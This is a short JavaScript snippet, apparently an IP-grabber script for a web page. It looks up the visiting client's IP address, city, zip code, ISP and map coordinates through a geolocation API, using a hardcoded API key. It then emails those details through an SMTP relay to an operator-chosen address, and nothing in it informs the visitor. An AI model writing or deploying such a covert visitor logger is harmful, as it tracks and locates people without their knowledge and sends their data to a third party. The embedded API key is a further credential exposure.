var ispo = {};
$.getJSON('https://api.ipgeolocation.io/ipgeo?apiKey=7634e348c5174d09a516c137bcc6c412', function(data) {
  var ispo = (JSON.stringify(data, null, 2));
  console.log('ok3');
  var obj = JSON.parse(ispo);
  var stringf = 'Client ip: '+obj.ip+'; <br/>'+ 'Continent code: ' + obj.continent_code + '; <br/> Country Capital: ' + obj.country_capital + '; <br/> State Province: ' +  obj.state_prov + '; <br/> District: ' + obj.district + '; <br/> City: ' + obj.city + ';<br/> Zip code: ' + obj.zipcode + '; <br/> Calling code: ' + obj.calling_code + ';  Isp Provider: ' + obj.isp + '; <br/> <img src="' + obj.country_flag + '" style="width:120px;height:120px;"><br/>' +  'Geoname id: ' + obj.geoname_id + '; <br/> About time: ' + obj.time_zone + '; <br/> Organisation: ' + obj.organization + '; <br/> About Money: ' + obj.currency + '; <br/> Connection type: ' + obj.connection_type + '; <br/> Languages: ' + obj.languages + '; <br/> Maps: <a href="https://www.google.com/maps/place/' + obj.latitude + ',' + obj.longitude + '">Maps Place';
  var toher = ''; ///To which email you want to send Kamakeparipv4
  var users = ''; /// Username at SMTP
  var passes = ''; ///Pass at SMTP
  var hostn = ''; ///Host at SMTP
  Email.send({
    Host : hostn,
    Username : users,
    Password : passes,
    To : toher,
    From : users,
    Body : 'All in json: '+ispo + '<br/>' + stringf ,
    Subject : "KamakeparIPv3"
}).then(
  message =>console.log(message)
);
});
